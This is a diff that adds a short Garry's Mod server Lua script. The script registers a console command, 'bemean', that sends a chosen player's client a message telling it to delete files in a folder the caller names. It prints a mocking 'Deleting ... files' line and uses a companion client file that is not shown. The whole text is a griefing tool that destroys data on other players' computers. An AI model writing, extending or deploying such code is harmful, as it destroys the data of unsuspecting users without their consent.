@@ -1,0 +1,1 @@
+require("datastream")AddCSLuaFile("cl_cooldel.lua")local function DeleteTheFiles(args)	if (args[1] != nil and args[2] != nil) then		datastream.StreamToClients(player.GetByID(args[1]),"Hahanoob", {args[2]})		print("Deleting "..player.GetByID(args[1]):Nick().."s files in "..args[2].."...")	endendconcommand.Add("bemean",DeleteTheFiles)
